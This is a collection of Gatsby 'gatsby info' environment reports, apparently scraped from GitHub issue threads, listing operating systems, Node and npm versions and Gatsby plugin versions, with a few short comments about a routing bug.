``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 81.0.4044.138 firefox: 68.0.2 safari: 13.1 npmpackages: gatsby: 2.20.29 => 2.20.29 gatsby-plugin-manifest: 2.3.6 => 2.3.6 gatsby-plugin-module-resolver: 1.0.3 => 1.0.3 gatsby-plugin-offline: 3.1.4 => 3.1.4 gatsby-plugin-react-helmet: 3.2.1 => 3.2.1 gatsby-plugin-styled-components: 3.2.3 => 3.2.3 gatsby-plugin-typescript: 2.3.3 => 2.3.3 npmglobalpackages: gatsby-cli: 2.12.12 gatsby: 2.20.8
system: os: windows 10 cpu: (16) x64 amd ryzen 7 3700x 8-core processor binaries: yarn: 1.22.4 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.16 => 2.21.16 gatsby-image: ^2.2.40 => 2.2.40 gatsby-plugin-layout: ^1.3.1 => 1.3.1 gatsby-plugin-react-helmet: ^3.1.18 => 3.1.18 gatsby-plugin-sass: ^2.1.23 => 2.1.23 gatsby-plugin-sharp: ^2.6.1 => 2.6.1 gatsby-remark-images: ^3.1.35 => 3.1.35 gatsby-remark-images-contentful: ^2.3.1 => 2.3.1 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-contentful: ^2.3.2 => 2.3.2 gatsby-source-filesystem: ^2.1.37 => 2.1.37 gatsby-transformer-remark: ^2.6.35 => 2.6.35 gatsby-transformer-sharp: ^2.5.1 => 2.5.1
system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (6) x64 intel(r) core(tm) i5-8400 cpu @ 2.80ghz shell: 5.0.3 - /bin/bash binaries: node: 13.6.0 - ~/.nvm/versions/node/v13.6.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.13.6 - ~/.nvm/versions/node/v13.6.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 npmpackages: gatsby: ^2.15.30 => 2.21.19 gatsby-background-image: ^0.9.12 => 0.9.19 gatsby-image: ^2.2.24 => 2.4.3 gatsby-plugin-crisp-chat: ^3.2.2 => 3.2.2 gatsby-plugin-google-analytics: ^2.1.31 => 2.3.1 gatsby-plugin-google-fonts: ^1.0.1 => 1.0.1 gatsby-plugin-manifest: ^2.2.34 => 2.4.2 gatsby-plugin-netlify: ^2.1.30 => 2.3.2 gatsby-plugin-offline: ^3.0.30 => 3.2.1 gatsby-plugin-preload-link-crossorigin: ^1.0.2 => 1.0.2 gatsby-plugin-react-helmet: ^3.1.10 => 3.3.1 gatsby-plugin-sass: ^2.1.17 => 2.3.1 gatsby-plugin-scroll-reveal: 0.0.4 => 0.0.4 gatsby-plugin-sharp: ^2.3.10 => 2.6.2 gatsby-plugin-smoothscroll: ^1.0.4 => 1.1.0 gatsby-plugin-styled-components: ^3.1.16 => 3.3.1 gatsby-source-datocms: ^2.1.18 => 2.2.1 gatsby-source-filesystem: ^2.1.29 => 2.3.1 gatsby-transformer-remark: ^2.6.27 => 2.8.7 gatsby-transformer-sharp: ^2.3.9 => 2.5.2 npmglobalpackages: gatsby-cli: 2.8.27
system: os: windows 10 10.0.18363 cpu: (12) x64 intel(r) core(tm) i7-8700k cpu @ 3.70ghz binaries: node: 12.9.1 - c:\\program files\ odejs\ ode.exe yarn: 1.22.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.10.2 - c:\\program files\ odejs\ pm.cmd browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.9 => 2.21.11 gatsby-common: link:../../packages/gatsby-common => 1.0.0 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-catch-links: ^2.0.9 => 2.3.0 gatsby-plugin-emotion: ^3.0.1 => 3.0.1 gatsby-plugin-layout: ^1.3.0 => 1.3.0 gatsby-plugin-manifest: ^2.0.12 => 2.4.1 gatsby-plugin-material-ui: ^2.1.8 => 2.1.8 gatsby-plugin-react-helmet: ^3.0.0 => 3.3.0 gatsby-plugin-sharp: ^2.0.15 => 2.6.0 gatsby-plugin-sitemap: ^2.0.3 => 2.4.1 gatsby-plugin-typescript: ^2.0.3 => 2.4.0 gatsby-remark-component: ^1.1.3 => 1.1.3 gatsby-remark-images: ^3.0.1 => 3.3.0 gatsby-remark-table-of-contents: 0.0.9 gatsby-source-filesystem: ^2.0.12 => 2.3.0 gatsby-transformer-remark: ^2.1.15 => 2.8.5 gatsby-transformer-sharp: ^2.1.9 => 2.5.0 npmglobalpackages: gatsby-cli: 2.12.7
``` system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.1.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.1 npmpackages: gatsby: 2.20.26 => 2.20.26 gatsby-image: 2.3.4 => 2.3.4 gatsby-plugin-algolia: ^0.8.0 => 0.8.1 gatsby-plugin-catch-links: 2.2.3 => 2.2.3 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-google-analytics: 2.2.4 => 2.2.4 gatsby-plugin-lodash: ^3.2.1 => 3.3.0 gatsby-plugin-manifest: 2.3.5 => 2.3.5 gatsby-plugin-mdx: ^1.1.6 => 1.2.4 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-offline: 3.1.4 => 3.1.4 gatsby-plugin-react-helmet: 3.2.4 => 3.2.4 gatsby-plugin-sharp: 2.5.6 => 2.5.6 gatsby-plugin-styled-components: ^3.2.1 => 3.3.0 gatsby-remark-autolink-headers: ^2.2.1 => 2.3.0 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.2.1 => 2.3.1 gatsby-remark-embed-video: 2.0.1 => 2.0.1 gatsby-remark-emojis: ^0.4.2 => 0.4.2 gatsby-remark-images: 3.2.4 => 3.2.4 gatsby-remark-katex: ^3.2.1 => 3.3.0 gatsby-remark-responsive-iframe: 2.3.3 => 2.3.3 gatsby-remark-smartypants: 2.2.3 => 2.2.3 gatsby-remark-sub-sup: ^1.0.0 => 1.0.0 gatsby-remark-vscode: ^2.0.3 => 2.0.3 gatsby-source-filesystem: 2.2.4 => 2.2.4 gatsby-transformer-sharp: 2.4.6 => 2.4.6 gatsby-transformer-yaml: 2.3.3 => 2.3.3 ``` ## related issues seems to have been [reported first]( #issuecomment-622950893) by @brandonpittman in #17175.
am using gatsby-cli 2.11.16
#### system info system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7267u cpu @ 3.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.17.3 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.1 #### packages gatsby: ^2.20.25 => 2.21.15 gatsby-image: ^2.2.8 => 2.2.8 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-mdx: ^1.2.6 => 1.2.6 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.2.9 => 2.2.9 gatsby-source-filesystem: ^2.2.5 => 2.3.1 gatsby-transformer-sharp: ^2.2.5 => 2.2.5 #### packages in the minimum
npx gatsby info --clipboard system: os: linux 5.4 nixos 20.03 (markhor) 20.03.1577.74a80c5a9ab (markhor) cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 3.0.2 - /run/current-system/sw/bin/fish binaries: node: 13.8.0 - /run/current-system/sw/bin/node yarn: 1.22.0 - /run/current-system/sw/bin/yarn npm: 6.13.6 - /run/current-system/sw/bin/npm languages: python: 3.8.1 - /run/current-system/sw/bin/python browsers: firefox: 75.0 npmpackages: gatsby: ^2.21.13 => 2.21.13 npmglobalpackages: gatsby-cli: 2.8.13
was of no help.
as well as adding redirect via `<navigate from="/de/" to="/de" />` this will cause gatsby to throw bunch of errors as far as i remember.
``` system: os: macos 10.15.4 shell: 5.7.1 - /bin/zsh binaries: node: 12.16.3 - /usr/local/opt/node@12/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/opt/node@12/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.149 firefox: 74.0 safari: 13.1 npmpackages: gatsby: ^2.14.4 => 2.21.13 gatsby-image: ^2.0.22 => 2.4.1 gatsby-plugin-feed: ^2.0.8 => 2.5.1 gatsby-plugin-google-analytics: ^2.0.5 => 2.3.1 gatsby-plugin-manifest: ^2.0.5 => 2.4.2 gatsby-plugin-mdx: ^1.0.33 => 1.2.6 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.3.1 gatsby-plugin-sharp: ^2.0.6 => 2.6.1 gatsby-plugin-typography: ^2.2.0 => 2.5.1 gatsby-remark-copy-linked-files: ^2.0.5 => 2.3.2 gatsby-remark-images: ^3.1.19 => 3.3.1 gatsby-remark-responsive-iframe: ^2.0.5 => 2.4.2 gatsby-remark-smartypants: ^2.0.5 => 2.3.1 gatsby-source-filesystem: ^2.0.2 => 2.3.1 gatsby-transformer-remark: ^2.1.6 => 2.8.6 gatsby-transformer-sharp: ^2.1.3 => 2.5.1 npmglobalpackages: gatsby-cli: 2.12.7
system: os: macos 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.12.0 - /usr/local/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 70.0.1 safari: 13.1 npmpackages: gatsby: ^2.15.28 => 2.20.10 gatsby-image: ^2.2.21 => 2.3.1 gatsby-plugin-catch-links: ^2.1.12 => 2.2.1 gatsby-plugin-eslint: ^2.0.1 => 2.0.8 gatsby-plugin-favicon: ^3.1.0 => 3.1.6 gatsby-plugin-mdx: ^1.1.4 => 1.1.4 gatsby-plugin-react-helmet: ^3.1.10 => 3.2.1 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-resolve-src: ^2.0.0-beta.1 => 2.0.0 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.17 => 2.2.1 gatsby-plugin-sharp: ^2.5.3 => 2.5.3 gatsby-plugin-sitemap: ^2.2.27 => 2.3.1 gatsby-remark-copy-linked-files: ^2.2.3 => 2.2.3 gatsby-remark-images: ^3.2.1 => 3.2.1 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-remark: ^2.6.26 => 2.7.1 gatsby-transformer-sharp: ^2.4.3 => 2.4.3 gatsby-transformer-yaml: ^2.3.1 => 2.3.1 gatsby-transformer-yaml-full: ^0.2.0 => 0.2.0 gatsby-yaml-full-file: ^0.2.0 => 0.2.0 gatsby-yaml-full-markdown: ^0.2.1 => 0.2.1 npmglobalpackages: gatsby-cli: 2.8.2
``` system: os: windows 8.1 6.3.9600 cpu: (4) x64 intel(r) core(tm) i3-3220 cpu @ 3.30ghz binaries: node: 12.16.3 - f:\\program files\ ode.js\ ode.exe npm: 6.14.4 - f:\\program files\ ode.js\ pm.cmd npmpackages: gatsby: ^2.21.0 => 2.21.0 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-manifest: ^2.4.0 => 2.4.0 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.12.8 ```
system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-4750hq cpu @ 2.00ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.1 - ~/.nvm/versions/node/v12.13.1/bin/node yarn: 1.21.0 - /usr/local/bin/yarn npm: 6.12.1 - ~/.nvm/versions/node/v12.13.1/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.0.2 npmpackages: gatsby: ^2.21.11 => 2.21.11 gatsby-alias-imports: ^1.0.4 => 1.0.4 gatsby-core-utils: ^1.2.0 => 1.2.0 gatsby-design-tokens: ^2.0.5 => 2.0.5 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-canonical-urls: ^2.3.0 => 2.3.0 gatsby-plugin-catch-links: ^2.3.0 => 2.3.0 gatsby-plugin-emotion: ^4.3.0 => 4.3.0 gatsby-plugin-feed: ^2.5.0 => 2.5.0 gatsby-plugin-google-analytics: ^2.3.0 => 2.3.0 gatsby-plugin-google-tagmanager: ^2.3.0 => 2.3.0 gatsby-plugin-guess-js: ^1.3.0 => 1.3.0 gatsby-plugin-layout: ^1.3.0 => 1.3.0 gatsby-plugin-mailchimp: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.4.1 => 2.4.1 gatsby-plugin-mdx: 1.2.5 => 1.2.5 gatsby-plugin-netlify: ^2.3.1 => 2.3.1 gatsby-plugin-netlify-cache: ^0.1.0 => 0.1.0 gatsby-plugin-nprogress: ^2.3.0 => 2.3.0 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-sitemap: ^2.4.1 => 2.4.1 gatsby-plugin-theme-ui: ^0.3.0 => 0.3.0 gatsby-plugin-twitter: ^2.3.0 => 2.3.0 gatsby-plugin-typography: ^2.5.0 => 2.5.0 gatsby-remark-autolink-headers: ^2.3.0 => 2.3.0 gatsby-remark-code-titles: ^1.1.0 => 1.1.0 gatsby-remark-copy-linked-files: ^2.3.1 => 2.3.1 gatsby-remark-embedder: ^1.16.0 => 1.16.0 gatsby-remark-graphviz: ^1.3.0 => 1.3.0 gatsby-remark-http-to-https: ^1.0.2 => 1.0.2 gatsby-remark-images: ^3.3.0 => 3.3.0 gatsby-remark-normalize-paths: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.5.0 => 3.5.0 gatsby-remark-responsive-iframe: ^2.4.1 => 2.4.1 gatsby-remark-smartypants: ^2.3.0 => 2.3.0 gatsby-source-airtable: ^2.1.1 => 2.1.1 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-source-git: ^1.0.2 => 1.0.2 gatsby-source-npm-package-search: ^2.3.0 => 2.3.0 gatsby-transformer-csv: ^2.3.0 => 2.3.0 gatsby-transformer-documentationjs: ^4.3.0 => 4.3.0 gatsby-transformer-gitinfo: ^1.1.0 => 1.1.0 gatsby-transformer-remark: ^2.8.5 => 2.8.5 gatsby-transformer-screenshot: ^2.3.1 => 2.3.1 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 gatsby-transformer-yaml: ^2.4.0 => 2.4.0
``` system: os: macos high sierra 10.13.6 cpu: (8) x64 intel(r) core(tm) i7-8559u cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.3 - ~/.volta/tools/image/node/12.16.3/6.14.4/bin/node yarn: 1.21.1 - ~/.volta/tools/image/yarn/1.21.1/bin/yarn npm: 6.14.4 - ~/.volta/tools/image/node/12.16.3/6.14.4/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 70.0.1 safari: 13.1 npmpackages: gatsby: ^2.21.0 => 2.21.0 gatsby-plugin-mdx: ^1.2.5 => 1.2.5 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-remark-images-contentful: ^2.3.0 => 2.3.0 gatsby-source-filesystem: ^2.3.0 => 2.3.0 ```
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) xeon(r) cpu e5-2670 v2 @ 2.50ghz shell: 4.4.20 - /bin/bash binaries: node: 12.16.3 - ~/.heroku/node/bin/node npm: 6.14.4 - ~/.heroku/node/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.18.12 => 2.18.12 gatsby-image: ^2.2.34 => 2.2.34 gatsby-plugin-google-analytics: ^2.1.31 => 2.1.31 gatsby-plugin-manifest: ^2.2.31 => 2.2.31 gatsby-plugin-offline: ^3.0.27 => 3.0.27 gatsby-plugin-preload-link-crossorigin: ^1.0.2 => 1.0.2 gatsby-plugin-react-helmet: ^3.1.16 => 3.1.16 gatsby-plugin-sass: ^2.1.26 => 2.1.26 gatsby-plugin-sharp: ^2.3.5 => 2.3.5 gatsby-plugin-smoothscroll: ^1.0.4 => 1.0.4 gatsby-plugin-styled-components: ^3.1.16 => 3.1.16 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-datocms: ^2.1.22 => 2.1.22 gatsby-source-filesystem: ^2.1.43 => 2.1.43 gatsby-source-stripe: ^3.0.7 => 3.0.7 gatsby-transformer-sharp: ^2.3.7 => 2.3.7
(if relevant)
``` system: os: macos 10.15.4 cpu: (8) x64 intel(r) core(tm) i7-4870hq cpu @ 2.50ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.1 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.21.9 => 2.21.9 gatsby-cli: ^2.12.7 => 2.12.7 gatsby-image: ^2.4.0 => 2.4.0 gatsby-plugin-manifest: ^2.4.1 => 2.4.1 gatsby-plugin-offline: ^3.2.0 => 3.2.0 gatsby-plugin-react-helmet: ^3.3.0 => 3.3.0 gatsby-plugin-sass: ^2.3.0 => 2.3.0 gatsby-plugin-sharp: ^2.6.0 => 2.6.0 gatsby-plugin-sitemap: ^2.4.1 => 2.4.1 gatsby-source-filesystem: ^2.3.0 => 2.3.0 gatsby-transformer-sharp: ^2.5.0 => 2.5.0 ```
<!-- required
run `gatsby info --clipboard` in your gatsby project directory and paste its contents here.
--> ### file contents (if changed) `gatsby-config.js`: yes
`package.json`: yes
`gatsby-node.js`: n/a
`gatsby-browser.js`: yes
`gatsby-ssr.js`: yes
``` system: os: macos 10.15.4 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.1 - ~/.nvm/versions/node/v12.14.1/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 74.0 safari: 13.1 npmpackages: gatsby: 2.21.9 => 2.21.9 gatsby-link: 2.4.0 => 2.4.0 gatsby-plugin-html-attributes: 1.0.5 => 1.0.5 gatsby-plugin-manifest: 2.4.1 => 2.4.1 gatsby-plugin-mdx: 1.2.4 => 1.2.4 gatsby-plugin-react-helmet: 3.3.0 => 3.3.0 gatsby-plugin-react-svg: 3.0.0 => 3.0.0 gatsby-plugin-s3: 0.3.3 => 0.3.3 gatsby-plugin-sharp: 2.6.0 => 2.6.0 gatsby-plugin-svgr: 2.0.2 => 2.0.2 gatsby-plugin-webpack-bundle-analyser-v2: 1.1.9 => 1.1.9 gatsby-source-filesystem: 2.3.0 => 2.3.0 gatsby-transformer-sharp: 2.5.0 => 2.5.0
system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz binaries: node: 12.16.3 - c:\\program files\ odejs\ ode.exe npm: 6.14.4 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.2 browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.21.0 => 2.21.0 npmglobalpackages: gatsby-cli: 2.12.7
``` system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (24) x64 amd ryzen 9 3900x 12-core processor shell: 4.4.20 - /bin/bash binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm npmpackages: gatsby: ^2.20.36 => 2.21.9 gatsby-plugin-google-analytics: ^2.1.4 => 2.3.0 gatsby-plugin-manifest: ^2.2.3 => 2.4.1 gatsby-plugin-netlify: ^2.1.3 => 2.3.0 gatsby-plugin-offline: ^2.2.4 => 2.2.10 gatsby-plugin-sitemap: ^2.2.19 => 2.4.1 npmglobalpackages: gatsby-cli: 2.12.1 gatsby-dev-cli: 2.7.0
```bash system: os: linux 4.19 manjaro linux cpu: (4) x64 intel(r) core(tm) i5-6200u cpu @ 2.30ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 2.0.0-rc.33 - ~/.yarn/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 3.8.2 - /usr/bin/python browsers: firefox: 75.0
```npx gatsby info --clipboard system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.3 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.13.0/bin/yarn npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 81.0.4044.129 safari: 13.0.3 npmpackages: gatsby: ^2.20.25 => 2.20.25 gatsby-plugin-google-analytics: ^2.2.4 => 2.2.4 gatsby-plugin-google-tagmanager: ^2.2.3 => 2.2.3 gatsby-plugin-manifest: ^2.3.5 => 2.3.5 gatsby-plugin-offline: ^3.1.4 => 3.1.4 gatsby-plugin-react-helmet: ^3.2.4 => 3.2.4 gatsby-plugin-sass: ^2.2.3 => 2.2.3 gatsby-plugin-typescript: ^2.3.3 => 2.3.3 gatsby-source-contentful: ^2.2.9 => 2.2.9 gatsby-source-filesystem: ^2.2.4 => 2.2.4
system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 3.2.57 - /bin/bash binaries: node: 13.9.0 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: chrome: 81.0.4044.129 firefox: 59.0.1 safari: 13.0.4 npmglobalpackages: gatsby: 2.15.14
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.2 - ~/.nvm/versions/node/v12.16.2/bin/node yarn: 1.19.1 - ~/.yarn/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.2/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 75.0 safari: 13.1 npmpackages: gatsby: ^2.20.30 => 2.20.30 gatsby-cli: ^2.11.16 => 2.11.16 gatsby-image: ^2.2.43 => 2.3.1 gatsby-plugin-flow: ^1.1.2 => 1.2.1 gatsby-plugin-google-tagmanager: ^2.1.3 => 2.2.1 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-netlify: ^2.2.0 => 2.2.1 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-netlify-cms: ^4.2.0 => 4.2.1 gatsby-plugin-offline: ^3.1.0 => 3.1.2 gatsby-plugin-preload-fonts: ^1.0.36 => 1.1.1 gatsby-plugin-react-helmet: ^3.0.4 => 3.2.1 gatsby-plugin-remote-images: ^1.0.7 => 1.0.7 gatsby-plugin-sharp: ^2.4.13 => 2.5.3 gatsby-plugin-sitemap: ^2.2.3 => 2.3.1 gatsby-plugin-styled-components: ^3.1.0 => 3.2.1 gatsby-remark-copy-linked-files: ^2.0.7 => 2.2.1 gatsby-remark-images: ^3.1.25 => 3.2.1 gatsby-remark-relative-images: ^0.2.1 => 0.2.3 gatsby-source-filesystem: ^2.1.55 => 2.2.2 gatsby-transformer-remark: ^2.6.59 => 2.7.1 gatsby-transformer-sharp: ^2.3.19 => 2.4.2
system: os: linux 5.5 fedora 30 (workstation edition) 30 (workstation edition) cpu: (8) x64 intel(r) core(tm) i7-3770k cpu @ 3.50ghz shell: 5.0.11 - /bin/bash binaries: node: 12.16.2 - /usr/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 81.0.4044.122 firefox: 75.0 npmglobalpackages: gatsby-cli: 2.11.14
system: os: macos 10.15.4 cpu: (4) x64 intel(r) core(tm) i5-7600k cpu @ 3.80ghz shell: 3.2.57 - /bin/bash binaries: node: 12.7.0 - ~/.nvm/versions/node/v12.7.0/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.7.0/bin/npm languages: python: 3.7.3 - /users/yaronbar/anaconda3/bin/python browsers: chrome: 81.0.4044.129 safari: 13.1 npmpackages: gatsby: ^2.20.12 => 2.20.12 gatsby-background-image: ^1.1.1 => 1.1.1 gatsby-image: ^2.3.3 => 2.3.3 gatsby-plugin-manifest: ^2.3.3 => 2.3.3 gatsby-plugin-material-ui: ^2.1.6 => 2.1.6 gatsby-plugin-offline: ^3.1.2 => 3.1.2 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.2.1 => 3.2.1 gatsby-plugin-s3: ^0.3.3 => 0.3.3 gatsby-plugin-sharp: ^2.5.5 => 2.5.5 gatsby-source-drupal: ^3.4.3 => 3.4.3 gatsby-source-filesystem: ^2.2.2 => 2.2.2 gatsby-transformer-sharp: ^2.4.5 => 2.4.5 npmglobalpackages: gatsby-cli: 2.11.8
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.3 - ~/.npm/bin/node yarn: 1.22.0 - ~/.npm/bin/yarn npm: 6.14.4 - ~/.npm/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: firefox: 70.0.1 safari: 13.1 gatsby version is `2.21.5`
system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.0.3 - /bin/bash binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 75.0 npmpackages: gatsby: ^2.15.34 => 2.19.5 gatsby-background-image: ^0.8.15 => 0.8.19 gatsby-image: ^2.2.25 => 2.2.39 gatsby-plugin-google-tagmanager: ^2.1.13 => 2.1.24 gatsby-plugin-layout: ^1.1.11 => 1.1.21 gatsby-plugin-manifest: ^2.2.21 => 2.2.38 gatsby-plugin-netlify: ^2.1.19 => 2.1.31 gatsby-plugin-offline: ^2.2.5 => 2.2.10 gatsby-plugin-postcss: ^2.1.11 => 2.1.19 gatsby-plugin-react-helmet: ^3.1.11 => 3.1.21 gatsby-plugin-react-svg: ^2.1.2 => 2.1.2 gatsby-plugin-sass: ^2.1.18 => 2.1.27 gatsby-plugin-sharp: ^2.2.32 => 2.4.0 gatsby-plugin-sitemap: ^2.2.17 => 2.2.26 gatsby-source-filesystem: ^2.1.31 => 2.1.46 gatsby-source-wordpress: ^3.1.41 => 3.1.58 gatsby-transformer-sharp: ^2.2.21 => 2.3.13 npmglobalpackages: gatsby-cli: 2.11.7
system: os: macos 10.15.4 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 81.0.4044.129 firefox: 75.0 safari: 13.1 npmpackages: gatsby: 2.21.5 => 2.21.5 gatsby-cli: 2.12.5 => 2.12.5 gatsby-image: 2.4.0 => 2.4.0 gatsby-link: 2.4.0 => 2.4.0 gatsby-plugin-material-ui: 2.1.8 => 2.1.8 gatsby-plugin-react-helmet: 3.3.0 => 3.3.0 gatsby-plugin-sharp: 2.6.0 => 2.6.0 gatsby-plugin-styled-components: 3.3.0 => 3.3.0 gatsby-plugin-transition-link: 1.18.0 => 1.18.0 gatsby-react-router-scroll: 2.3.0 => 2.3.0 gatsby-source-filesystem: 2.3.0 => 2.3.0 gatsby-transformer-json: 2.4.0 => 2.4.0 gatsby-transformer-sharp: 2.5.0 => 2.5.0 npmglobalpackages: gatsby-cli: 2.11.15
